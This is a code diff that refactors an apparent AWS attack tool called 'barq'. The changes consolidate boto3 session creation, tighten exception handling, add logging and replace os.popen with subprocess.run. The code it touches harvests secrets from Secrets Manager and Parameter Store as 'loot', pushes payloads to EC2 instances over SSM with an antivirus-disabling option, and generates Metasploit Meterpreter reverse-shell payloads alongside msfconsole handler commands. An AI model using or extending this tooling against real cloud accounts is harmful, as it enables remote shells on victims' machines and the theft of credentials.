@@ -14,35 +14,39 @@ import readline
 import sys
 import signal
 import re
-from threading import Event, Thread
+from threading import Thread
 import logging
 from getpass import getpass
 from pygments import highlight
 from pygments.lexers.data import JsonLexer
 from pygments.formatters.terminal import TerminalFormatter
-#signing commit again
-PY2 = sys.version_info[0] == 2
-PY3 = sys.version_info[0] == 3
-
-if PY3:
-    string_types = str,
-    raw_input = input
-else:
-    string_types = basestring,
+raw_input = input
 
 def id_generator(size=10, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
+
+def create_boto3_session(access_key, secret_key, region, session_token=''):
+    """
+    Create a boto3 session with the given credentials.
+    :param access_key: AWS access key id
+    :param secret_key: AWS secret access key
+    :param region: AWS region name
+    :param session_token: AWS session token (optional)
+    :return: boto3 Session object
+    """
+    if session_token == '':
+        return boto3.session.Session(aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)
+    return boto3.session.Session(aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region, aws_session_token=session_token)
 
 def set_session_region(region):
     global my_aws_creds
     mysession = None
     try:
-        if my_aws_creds['aws_session_token'] == '':
-            mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],aws_secret_access_key=my_aws_creds['aws_secret_access_key'],region_name=region)
-        else:
-            mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],aws_secret_access_key=my_aws_creds['aws_secret_access_key'],region_name=region,aws_session_token=my_aws_creds['aws_session_token'])
+        mysession = create_boto3_session(my_aws_creds['aws_access_key_id'], my_aws_creds['aws_secret_access_key'], region, my_aws_creds['aws_session_token'])
         return mysession
-    except:
+    except (KeyError, Exception) as e:
+        logger = logging.getLogger('log')
+        logger.error('Failed to set session region %s: %s' % (region, e))
         return None
 
 
@@ -133,26 +137,26 @@ def start():
     if '--keyid' in myargs or '-k' in myargs:
         try:
             aws_access_key_id = myargs['--keyid'][0]
-        except:
+        except (KeyError, IndexError):
             aws_access_key_id = myargs['-k'][0]
         if '--secretkey' not in myargs and '-s' not in myargs:
             puts(color("[!] using --secretkey is mandatory with --keyid"))
             exit()
         try:
             aws_secret_access_key = myargs['--secretkey'][0]
-        except:
+        except (KeyError, IndexError):
             aws_secret_access_key = myargs['-s'][0]
         if '--region' not in myargs and '-r' not in myargs:
             puts(color("[!] using --region is mandatory with --keyid"))
             exit()
         try:
             region_name = myargs['--region'][0]
-        except:
+        except (KeyError, IndexError):
             region_name = myargs['-r'][0]
         if '--token' in myargs or '-t' in myargs:
             try:
                 aws_session_token = myargs['--token'][0]
-            except:
+            except (KeyError, IndexError):
                 aws_session_token = myargs['-t'][0]
         else:
             aws_session_token = ''
@@ -196,9 +200,9 @@ def menu_backward():
             go_to_menu(next_menu)
         elif next_menu == 'ec2instances':
             go_to_menu(next_menu)
-    except Exception as e:
-        print(e)
-        pass
+    except (IndexError, KeyError) as e:
+        logger = logging.getLogger('log')
+        logger.error('menu_backward error: %s' % e)
 
 def go_to_menu(menu):
     """
@@ -230,8 +234,9 @@ def handle_menu():
             training_loop()
         else:
             main_loop()
-    except Exception as e:
-        print(e)
+    except (IndexError, KeyError) as e:
+        logger = logging.getLogger('log')
+        logger.error('handle_menu error: %s' % e)
     main_loop()
 
 def training_loop():
@@ -247,9 +252,11 @@ def training_loop():
                 readline.parse_and_bind("tab: complete")
                 readline.set_completer(trainingcomplete)
                 command = raw_input('barq ' +color('training','yellow') + ' > ' )
+            except EOFError:
+                break
             except Exception as e:
-                print(e)
-            #command = prompt.query('aws sheller training > ', validators=[])
+                logger = logging.getLogger('log')
+                logger.error('training_loop input error: %s' % e)
         command = str(command)
         process_training_command(command)
     except KeyboardInterrupt as k:
@@ -306,10 +313,7 @@ def wait_for_threaded_command_invocation( commandid,instanceid, region):
     global my_aws_creds
     logger = logging.getLogger('log')
     logger.error('inside wait_for_threaded_command_invocation for %s and commandid: %s' %( instanceid,commandid))
-    mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],
-                                      aws_secret_access_key=my_aws_creds['aws_secret_access_key'],
-                                      region_name=region,
-                                      aws_session_token=my_aws_creds['aws_session_token'])
+    mysession = create_boto3_session(my_aws_creds['aws_access_key_id'], my_aws_creds['aws_secret_access_key'], region, my_aws_creds['aws_session_token'])
     ssmclient = mysession.client('ssm', region_name=region)
     time.sleep(10)
     logger.error('inside wait_for_threaded_command_invocation for %s and commandid: %s, before get_command_invocation a' % (instanceid, commandid))
@@ -359,9 +363,7 @@ def run_threaded_linux_command(mysession, target, action, payload):
     global command_invocations
     logger = logging.getLogger('log')
     logger.error('inside run_threaded_linux_command for %s' %target['id'])
-    mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],
-                                      aws_secret_access_key=my_aws_creds['aws_secret_access_key'], region_name=target['region'],
-                                      aws_session_token=my_aws_creds['aws_session_token'])
+    mysession = create_boto3_session(my_aws_creds['aws_access_key_id'], my_aws_creds['aws_secret_access_key'], target['region'], my_aws_creds['aws_session_token'])
     ssmclient = mysession.client('ssm',region_name=target['region'])
     instanceid = target['id']
     response = ssmclient.send_command(InstanceIds=[instanceid,],DocumentName=action,DocumentVersion='$DEFAULT',TimeoutSeconds=3600,Parameters={'commands':[payload]})
@@ -376,8 +378,9 @@ def run_threaded_linux_command(mysession, target, action, payload):
     time.sleep(10)
     try:
         result = ssmclient.get_command_invocation(CommandId=commandid,InstanceId=instanceid)
-    except:
-        pass
+    except Exception as e:
+        logger.error('get_command_invocation failed for %s: %s' % (target['id'], e))
+        return False
     logger.error('calling run_threaded_linux_command for %s and command: %s and result: %s' % (target['id'], commandid,result['Status']))
     while result['Status'] in {'InProgress', 'Pending','Waiting'}:
         time.sleep(10)
@@ -413,10 +416,7 @@ def run_threaded_windows_command(mysession, target, action, payload, disableav):
     global command_invocations
     logger = logging.getLogger('log')
     logger.error("inside run_threaded_windows_command for %s" % target['id'])
-    mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],
-                                      aws_secret_access_key=my_aws_creds['aws_secret_access_key'],
-                                      region_name=target['region'],
-                                      aws_session_token=my_aws_creds['aws_session_token'])
+    mysession = create_boto3_session(my_aws_creds['aws_access_key_id'], my_aws_creds['aws_secret_access_key'], target['region'], my_aws_creds['aws_session_token'])
 
     logger.error("inside run_threaded_windows_command for %s, before line: %s" % (target['id'],'ssmclient'))
     ssmclient = mysession.client('ssm',region_name=target['region'])
@@ -431,9 +431,9 @@ def run_threaded_windows_command(mysession, target, action, payload, disableav):
         logger.error("inside run_threaded_windows_command for %s, before line: %s" % (target['id'], 'get_command_invocation 1'))
         try:
             result = ssmclient.get_command_invocation(CommandId=commandid,InstanceId=instanceid)
-        except:
-            pass
-    #############
+        except Exception as e:
+            logger.error('get_command_invocation failed for %s: %s' % (target['id'], e))
+            return False
         success, result = wait_for_threaded_command_invocation(commandid,instanceid, target['region'])
         logger.error("inside run_threaded_windows_command for %s, after line: %s" % (target['id'], 'wait_for_threaded_command_invocation 1'))
         logger.error("success equals: %s" %success)
@@ -457,8 +457,9 @@ def run_threaded_windows_command(mysession, target, action, payload, disableav):
     logger.error("inside run_threaded_windows_command for %s, before line: %s" % (target['id'], 'get_command_invocation 2'))
     try:
         result = ssmclient.get_command_invocation(CommandId=commandid,InstanceId=instanceid)
-    except:
-        pass
+    except Exception as e:
+        logger.error('get_command_invocation failed for %s: %s' % (target['id'], e))
+        return False
     while result['Status'] in {'InProgress', 'Pending','Waiting'}:
         time.sleep(10)
         result = ssmclient.get_command_invocation(CommandId=commandid,InstanceId=instanceid)
@@ -720,7 +721,7 @@ def metasploit_installed_multiple_options(  linux, windows):
         puts(color('[*] Run the following command on your remote listening server to run the linux payload handler:'))
         msfconsole_cmd = "msfconsole -x 'use exploit/multi/handler; set LHOST %s; set lport %s; set payload %s;run -j;'" %(host, port, linuxpayload)
         puts(colored.magenta(msfconsole_cmd))
-        linuxattack = os.popen(linuxmsfshell).read()
+        linuxattack = subprocess.run(linuxmsfshell, shell=True, capture_output=True, text=True).stdout
         linuxattack = "python -c \"%s\"" %linuxattack
     if windows:
         windows_options = [{'selector':'1','prompt':'Windows Meterpreter reverse TCP x64','return':windows_tcp_meterpreterx64},
@@ -733,7 +734,7 @@ def metasploit_installed_multiple_options(  linux, windows):
         puts(color('[*] Run the following command on your remote listening server to run the windows payload handler:'))
         msfconsole_cmd = "msfconsole -x 'use exploit/multi/handler; set LHOST %s; set lport %s; set payload %s;run -j;'" %(host, port, windowspayload)
         puts(colored.magenta(msfconsole_cmd))
-        windowsattack = os.popen(windowsmsfshell).read()
+        windowsattack = subprocess.run(windowsmsfshell, shell=True, capture_output=True, text=True).stdout
         
     return linuxattack, windowsattack
 
@@ -747,8 +748,6 @@ def metasploit_installed_options(host, port, OS):
     :return: Tuple of reverse shell payloads for linux and windows.
     """
     puts(color('[*] Choose your metasploit payload. This requires msfvenom to be installed in your system.'))
-    
-    #output = os.popen("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f psh --smallest").read()`
     
     linux_tcp_meterpreterx64 = 'python/meterpreter/reverse_tcp'
     linux_https_meterpreterx64 = 'python/meterpreter/reverse_https'
@@ -777,7 +776,7 @@ def metasploit_installed_options(host, port, OS):
     msfconsole_cmd = "msfconsole -x 'use exploit/multi/handler; set LHOST %s; set lport %s; set payload %s;run -j;'" %(host, port, payload)
     puts(colored.magenta(msfconsole_cmd))
 
-    shellcode = os.popen(msfshell).read()
+    shellcode = subprocess.run(msfshell, shell=True, capture_output=True, text=True).stdout
     if OS == 'linux':
         shellcode = "python -c \"%s\"" %shellcode
 
@@ -791,10 +790,10 @@ def start_training_mode(caller):
     :return: None
     """
     global my_aws_creds
-    mysession = ''
+    mysession = None
     try:
         mysession = my_aws_creds['session']
-    except:
+    except KeyError:
         puts(color("[!] Error! No EC2 credentials set. Call setprofile first!"))
         go_to_menu(caller)
     ec2resource = mysession.resource('ec2')
@@ -885,17 +884,6 @@ def process_training_command(command):
 
     training_loop()
 
-    """             pass
-    elif command == 'setprofile':
-        set_aws_creds('main')
-    elif command == 'showprofile':
-        show_aws_creds('main')
-    elif command == 'dumpsecrets':
-        find_all_creds('main')
-    elif command == 'attacksurface':
-        find_attacksurface('main')
-"""
-
 global INSTANCESIDCOMMANDS
 INSTANCESIDCOMMANDS = []
 
@@ -921,11 +909,11 @@ def get_instance_details(caller):
     global ec2instances
     global INSTANCESIDCOMMANDS
     INSTANCESIDCOMMANDS = []
-    mysession = ''
+    mysession = None
     try:
         mysession = my_aws_creds['session']
         possible_regions = my_aws_creds['possible_regions']
-    except:
+    except KeyError:
         puts(color("[!] Error! No EC2 credentials set. Call setprofile first!"))
         go_to_menu(caller)
     try:
@@ -944,7 +932,8 @@ def get_instance_details(caller):
                                          ins.get('public_dns_name'), ins.get('iam_profile', '')])
 
     except Exception as e:
-        print(e)
+        logger = logging.getLogger('log')
+        logger.error('get_instance_details error: %s' % e)
         puts(color('[!] You have no stored EC2 instances. Run the command attacksurface to discover them'))
         go_to_menu(caller)
     print(instances_table)
@@ -958,7 +947,7 @@ def get_instance_details(caller):
     for ins in ec2instances['instances']:
         if ins['id'] == target:
             region = ins['region']
-            break;
+            break
     ec2client = mysession.client('ec2',region_name=region)
     result = ec2client.describe_instances(InstanceIds=[target,])
 
@@ -1022,8 +1011,11 @@ def instances_loop():
                 readline.parse_and_bind("tab: complete")
                 readline.set_completer(instancecomplete)
                 command = raw_input('barq '+color('instances','blue')+' > ')
+            except EOFError:
+                break
             except Exception as e:
-                print(e)
+                logger = logging.getLogger('log')
+                logger.error('instances_loop input error: %s' % e)
         command = str(command)
         process_instances_command(command)
     except KeyboardInterrupt as k:
@@ -1048,7 +1040,7 @@ def main_loop():
                 readline.parse_and_bind("tab: complete")
                 readline.set_completer(maincomplete)
                 command = raw_input('barq '+color('main','green')+' > ')
-            except Exception as e:
+            except EOFError:
                 exit()
             #command = prompt.query('aws sheller main> ', validators=[])
         command = str(command)
@@ -1073,10 +1065,7 @@ def process_main_command(command):
         puts(colored.green('You are the at the top menu.'))
     elif command == 'exit':
         #cleanup tasks
-        try:
-            exit()
-        except:
-             pass
+        exit()
     elif command == 'setprofile':
         set_aws_creds('main')
     elif command == 'showprofile':
@@ -1107,11 +1096,11 @@ def find_all_creds(caller):
     """
     global my_aws_creds
     global loot_creds
-    mysession = ''
+    mysession = None
     try:
         mysession = my_aws_creds['session']
         possible_regions = my_aws_creds['possible_regions']
-    except:
+    except KeyError:
         puts(color("[!] Error! No EC2 credentials set. Call setprofile first!"))
         go_to_menu(caller)
     loot_creds = {'secrets':[],'tokens':[],'parameters':[]}
@@ -1119,13 +1108,7 @@ def find_all_creds(caller):
     for region in possible_regions:
         puts(color('[*] Region currently searched for secrets: %s'%region))
         puts(color('[..] Now searching for secrets in Secret Manager'))
-        #if my_aws_creds['aws_session_token'] == '':
-        #    mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],aws_secret_access_key=my_aws_creds['aws_secret_access_key'],region_name=region)
-        #else:
-            #mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],aws_secret_access_key=my_aws_creds['aws_secret_access_key'],region_name=region,aws_session_token=my_aws_creds['aws_session_token'])
-        mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],
-                                          aws_secret_access_key=my_aws_creds['aws_secret_access_key'],
-                                          region_name=region, aws_session_token=my_aws_creds['aws_session_token'])
+        mysession = create_boto3_session(my_aws_creds['aws_access_key_id'], my_aws_creds['aws_secret_access_key'], region, my_aws_creds['aws_session_token'])
         secretsclient = mysession.client(service_name='secretsmanager',region_name=region)
         try:
             secrets = secretsclient.list_secrets()['SecretList']
@@ -1141,7 +1124,7 @@ def find_all_creds(caller):
                 description = resp2.get('Description','')
                 loot_creds['secrets'].append({'name':name,'value':resp['SecretString'],'description':description})
         except Exception as e:
-            print(e)
+            logger.error('Secret Manager error in region %s: %s' % (region, e))
             puts(color('[!] No secrets in this region\'s Secret Manager...'))
         puts(color('[..] Now searching for secrets in Parameter Store'))
         ssmclient = mysession.client('ssm',region_name=region)
@@ -1156,9 +1139,9 @@ def find_all_creds(caller):
                 for getparam in getparamsresponse:
                     puts(colored.magenta("Parameter Name: %s, Parameter Value: %s" %(getparam['Name'], getparam['Value'])))
                     loot_creds['parameters'].append({'name':getparam['Name'],'value':getparam['Value']})
-        except Exception as e: 
-            print(e)
-            puts(color('[!] No Paramters in this region\'s Parameter Store...'))
+        except Exception as e:
+            logger.error('Parameter Store error in region %s: %s' % (region, e))
+            puts(color('[!] No Parameters in this region\'s Parameter Store...'))
             
     puts(color("[+] Done iterating on AWS secrets and parameters."))
     go_to_menu(caller)
@@ -1186,10 +1169,11 @@ def show_cred_loot(caller):
         for param in loot_creds['parameters']:
             puts(color("===========", 'blue'))
             puts(color('[+] Name: %s' % param.get('name')))
-            puts(color('[+] Value: %s' % param.get('name')))
+            puts(color('[+] Value: %s' % param.get('value')))
             #puts(colored.green('name: %s, value: %s'%(param.get('name'),param.get('value'))))
     except Exception as e:
-        print(e)
+        logger = logging.getLogger('log')
+        logger.error('show_cred_loot error: %s' % e)
         puts(color('[!] A problem in finding stored secrets or parameters. Run the command dumpsecrets to set them'))
     go_to_menu(caller)
 
@@ -1211,10 +1195,12 @@ def get_ec2_instances(caller):
                                              ins.get('public_dns_name'), ins.get('iam_profile', '')])
 
         print(instances_table)
-    except:
+    except Exception as e:
+        logger = logging.getLogger('log')
+        logger.error('get_ec2_instances error: %s' % e)
         puts(color('[!] You have no stored EC2 instances. Run the command attacksurface to discover them'))
     go_to_menu(caller)
-    
+
 def get_security_groups(caller):
     """
     List security groups discovered.
@@ -1248,7 +1234,8 @@ def get_security_groups(caller):
             puts(colored.magenta('======================================='))
 
     except Exception as e:
-        print(e)
+        logger = logging.getLogger('log')
+        logger.error('get_security_groups error: %s' % e)
         puts(color('[!] You have no stored security groups. Run the command attacksurface to discover them'))
     go_to_menu(caller)
 
@@ -1263,14 +1250,14 @@ def ec2attacks(caller):
     global ec2instances
     global INSTANCESIDCOMMANDS
     INSTANCESIDCOMMANDS = []
-    mysession = ''
+    mysession = None
     linux = False
     windows = False
     actual_targets = []
     try:
         mysession = my_aws_creds['session']
         possible_regions = my_aws_creds['possible_regions']
-    except:
+    except KeyError:
         puts(color("[!] Error! No EC2 credentials set. Call setprofile first!"))
         go_to_menu(caller)
     try:
@@ -1292,7 +1279,8 @@ def ec2attacks(caller):
             else:
                 windows = True
     except Exception as e:
-        print(e)
+        logger = logging.getLogger('log')
+        logger.error('ec2attacks error: %s' % e)
         puts(color('[!] You have no stored EC2 instances. Run the command attacksurface to discover them'))
         go_to_menu(caller)
     print(instances_table)
@@ -1481,14 +1469,12 @@ def check_command_invocations(caller):
         puts(colored.green('command state: %s'%command.get('state')))
         puts(colored.green('command platform: %s'%command.get('platform')))
         puts(colored.green('command region: %s'%command.get('region') ))
-        try:
-            puts(colored.green('command error: %s'%command.get('error','No errors')[0:5000]))
-        except:
-            pass
-        try:
-            puts(colored.green('command output: %s'%command.get('output', 'No output')[0:5000] ))
-        except:
-            pass
+        error_val = command.get('error', 'No errors')
+        if error_val:
+            puts(colored.green('command error: %s' % str(error_val)[0:5000]))
+        output_val = command.get('output', 'No output')
+        if output_val:
+            puts(colored.green('command output: %s' % str(output_val)[0:5000]))
             
         puts(colored.magenta('======================================='))
         
@@ -1503,11 +1489,11 @@ def find_attacksurface(caller):
     global ec2instances
     global secgroups
     global lambdafunctions
-    mysession = ''
+    mysession = None
     try:
         mysession = my_aws_creds['session']
         possible_regions = my_aws_creds['possible_regions']
-    except:
+    except KeyError:
         puts(color("[!] Error! No AWS credentials set. Call setprofile first!"))
         go_to_menu(caller)
     ec2instances = {'instances':[]}
@@ -1516,10 +1502,7 @@ def find_attacksurface(caller):
     for region in possible_regions:
         puts(color('[*] Region currently searched for details: %s'%region))
         
-        #if my_aws_creds['aws_session_token'] == '':
-        #    mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],aws_secret_access_key=my_aws_creds['aws_secret_access_key'],region_name=region)
-        #else:
-        mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],aws_secret_access_key=my_aws_creds['aws_secret_access_key'],region_name=region,aws_session_token=my_aws_creds['aws_session_token'])
+        mysession = create_boto3_session(my_aws_creds['aws_access_key_id'], my_aws_creds['aws_secret_access_key'], region, my_aws_creds['aws_session_token'])
         ec2resource = mysession.resource('ec2')
         lambdaclient = mysession.client('lambda')
         instances = ec2resource.instances.all()
@@ -1628,10 +1611,7 @@ def set_aws_creds(caller):
     aws_secret_access_key = getpass('Enter AWS Secret Access Key:')
     puts(color("[*] secret key is: %s************%s"%(aws_secret_access_key[0:2],aws_secret_access_key[-3:-1])))
     aws_session_token = getpass("Enter your session token, only if needed: ")
-    if aws_session_token == '':
-        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,aws_secret_access_key=aws_secret_access_key,region_name='us-west-2')
-    else:
-        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,aws_secret_access_key=aws_secret_access_key,region_name='us-west-2', aws_session_token=aws_session_token)
+    mysession = create_boto3_session(aws_access_key_id, aws_secret_access_key, 'us-west-2', aws_session_token)
     ec2client = mysession.client('ec2')
     regionresponse = ''
     choose_your_region = False
@@ -1646,7 +1626,7 @@ def set_aws_creds(caller):
             choose_your_region = True
         else:
             puts(color("[!] Error accessing AWS services. Double check your AWS keys, tokens, privileges and region."))
-            print(e)
+            logger.error('set_aws_creds error: %s' % e)
         if choose_your_region == False:
             go_to_menu(caller)
     if choose_your_region == True:
@@ -1663,14 +1643,9 @@ def set_aws_creds(caller):
         if chosen_region not in possible_regions:
             puts(color("[!] Invalid AWS region! Exiting...."))
             exit()
-    if aws_session_token == '':
-        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,aws_secret_access_key=aws_secret_access_key,region_name=chosen_region)
-    else:
-        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,aws_secret_access_key=aws_secret_access_key,region_name=chosen_region,aws_session_token=aws_session_token)
+    mysession = create_boto3_session(aws_access_key_id, aws_secret_access_key, chosen_region, aws_session_token)
     my_aws_creds = {'aws_access_key_id':aws_access_key_id,'aws_secret_access_key':aws_secret_access_key,'region_name':chosen_region,'aws_session_token':aws_session_token,'session':mysession,'possible_regions':possible_regions}
-    #menu_stack.append(caller)
-    #handle_menu()
-    go_to_menu(caller)#menu_backward()
+    go_to_menu(caller)
 
 
 def set_aws_creds_inline(aws_access_key_id,aws_secret_access_key,region_name,aws_session_token):
@@ -1683,10 +1658,7 @@ def set_aws_creds_inline(aws_access_key_id,aws_secret_access_key,region_name,aws
     :return: None
     """
     global my_aws_creds
-    if aws_session_token == '':
-        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,aws_secret_access_key=aws_secret_access_key,region_name=region_name)
-    else:
-        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,aws_secret_access_key=aws_secret_access_key,region_name=region_name, aws_session_token=aws_session_token)
+    mysession = create_boto3_session(aws_access_key_id, aws_secret_access_key, region_name, aws_session_token)
     ec2client = mysession.client('ec2')
     regionresponse = ''
     try:
@@ -1705,10 +1677,7 @@ def set_aws_creds_inline(aws_access_key_id,aws_secret_access_key,region_name,aws
     if region_name not in possible_regions:
         puts(color("[!] Invalid AWS region! Exiting...."))
         exit()
-    if aws_session_token == '':
-        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,aws_secret_access_key=aws_secret_access_key,region_name=region_name)
-    else:
-        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,aws_secret_access_key=aws_secret_access_key,region_name=region_name,aws_session_token=aws_session_token)
+    mysession = create_boto3_session(aws_access_key_id, aws_secret_access_key, region_name, aws_session_token)
     my_aws_creds = {'aws_access_key_id':aws_access_key_id,'aws_secret_access_key':aws_secret_access_key,'region_name':region_name,'aws_session_token':aws_session_token,'session':mysession,'possible_regions':possible_regions}
 
 def show_aws_creds(caller):
@@ -1730,7 +1699,7 @@ def show_aws_creds(caller):
         puts(color('[*] secret access key: %s'%my_aws_creds['aws_secret_access_key']))
         puts(color('[*] session token: %s'%my_aws_creds['aws_session_token']))
         puts(color('[*] region: %s'%my_aws_creds['region_name']))
-    except:
+    except KeyError:
         puts(color('[!] You haven\'t set your AWS credentials yet. Run the command dumpsecrets to set them'))
     #menu_stack.append(caller)
     #handle_menu()
